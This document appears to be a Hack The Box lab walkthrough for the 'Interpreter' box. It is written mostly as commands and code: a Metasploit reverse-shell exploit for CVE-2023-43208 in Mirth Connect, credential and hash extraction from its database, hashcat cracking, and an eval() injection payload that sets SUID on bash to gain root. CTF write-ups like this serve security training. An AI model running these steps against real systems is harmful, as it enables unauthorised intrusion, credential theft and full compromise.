# ğŸ”“ HTB â€” Interpreter | Full Walkthrough (SPOILERS)

> âš ï¸ **SPOILER WARNING** â€” Full attack chain documented below.

| Field | Details |
|---|---|
| **Box** | Interpreter |
| **Difficulty** | Medium |
| **OS** | Linux |
| **Attack Chain** | CVE-2023-43208 â†’ DB Pillage â†’ Hash Crack â†’ eval() Injection â†’ Root |

---

## Step 1 â€” Enumeration

```bash
nmap -sVC 10.129.88.124
```

Ports 80/443 expose a **Mirth Connect Administrator** dashboard.
Nessus fingerprints the version as **NextGen Mirth Connect 4.4.0** â€” vulnerable to CVE-2023-43208.

---

## Step 2 â€” Initial Access (CVE-2023-43208)

Mirth Connect < 4.4.1 is vulnerable to unauthenticated RCE via insecure Java deserialization
in the XML unmarshalling API.

```
msf6 > use exploit/multi/http/mirth_connect_cve_2023_43208
msf6 > set RHOSTS 10.129.88.124
msf6 > set LHOST 10.10.14.67
msf6 > set payload cmd/unix/reverse_bash   # staged meterpreter fails â€” use this
msf6 > run
```

Shell lands as `mirth` (uid=103).

---

## Step 3 â€” Database Pillaging

Enumerate Mirth Connect config for DB credentials:

```bash
cat /usr/local/mirthconnect/conf/mirth.properties
```

Reveals:
```
database.url      = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = MirthPass123!
```

Query the database for user credentials:

```bash
mysql -u mirthdb -pMirthPass123! -D mc_bdd_prod -e "SELECT * FROM PERSON;"
mysql -u mirthdb -pMirthPass123! -D mc_bdd_prod -e "SELECT * FROM PERSON_PASSWORD;"
```

Recovers user **sedric** and a PBKDF2-HMAC-SHA256 Base64 password hash.

---

## Step 4 â€” Hash Cracking (Hashcat mode 10900)

Mirth Connect 4.4.0 uses PBKDF2-HMAC-SHA256 with **600,000 iterations**.
The 8-byte salt is prepended to the 32-byte hash within the Base64 blob.

**Extract and reformat:**

```bash
# Decode base64 to hex
echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEKPU17itdrVWA/kLMt3w+w==' | base64 -d | xxd -p | tr -d '\n'

# Re-encode salt and hash separately
SALT=$(echo -n "bbff8b0413949da7" | xxd -r -p | base64)
HASH=$(echo -n "62c8506c30ea080cf2db511d2b939f6410a3d4d7b8ad76b55603f90b32ddf0fb" | xxd -r -p | base64)

# Build Hashcat-compatible string
echo "sha256:600000:$SALT:$HASH" > sedric_hash.txt
```

**Crack:**

```bash
hashcat -m 10900 sedric_hash.txt /opt/rockyou.txt
```

**Result:** `sedric : snowflake1`

SSH or `su` to `sedric`.

---

## Step 5 â€” Privilege Escalation (Python eval() Injection + Regex Bypass)

Discover a Flask API running as root on localhost:

```bash
ss -tlnp
# 127.0.0.1:54321
cat /usr/local/bin/notif.py
```

The app accepts XML input and evaluates it unsafely:

```python
return eval(f"f'''{template}'''")
```

A regex filter blocks spaces: `^[a-zA-Z0-9._\'"(){}=+/]+$`

**Bypass:** use `__import__("os").system("/tmp/s")` â€” no spaces needed.

**Stage the SUID payload:**

```bash
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/s
chmod +x /tmp/s
```

**Send the exploit:**

```python
# /tmp/send.py
import urllib.request

xml_data = b"""<patient>
  <firstname>{__import__("os").system("/tmp/s")}</firstname>
  <lastname>L</lastname>
  <sender_app>S</sender_app>
  <timestamp>T</timestamp>
  <birth_date>01/01/2000</birth_date>
  <gender>G</gender>
</patient>"""

headers = {'Content-Type': 'application/xml'}
req = urllib.request.Request("http://127.0.0.1:54321/addPatient", data=xml_data, headers=headers)
urllib.request.urlopen(req)
```

```bash
python3 /tmp/send.py
```

**Escalate:**

```bash
ls -la /bin/bash   # confirm SUID bit set
bash -p
id                 # uid=1000(sedric) euid=0(root)
cat /root/root.txt
cat /home/sedric/user.txt
```

---

## ğŸ—ºï¸ Attack Chain Summary

```
nmap â†’ Mirth Connect 4.4.0
     â†’ CVE-2023-43208 (unauth RCE) â†’ shell as mirth
     â†’ mirth.properties â†’ MariaDB creds
     â†’ PERSON_PASSWORD table â†’ sedric PBKDF2 hash
     â†’ hashcat m10900 â†’ sedric:snowflake1
     â†’ notif.py Flask API (localhost:54321)
     â†’ eval() + __import__ regex bypass
     â†’ SUID bash â†’ root
```
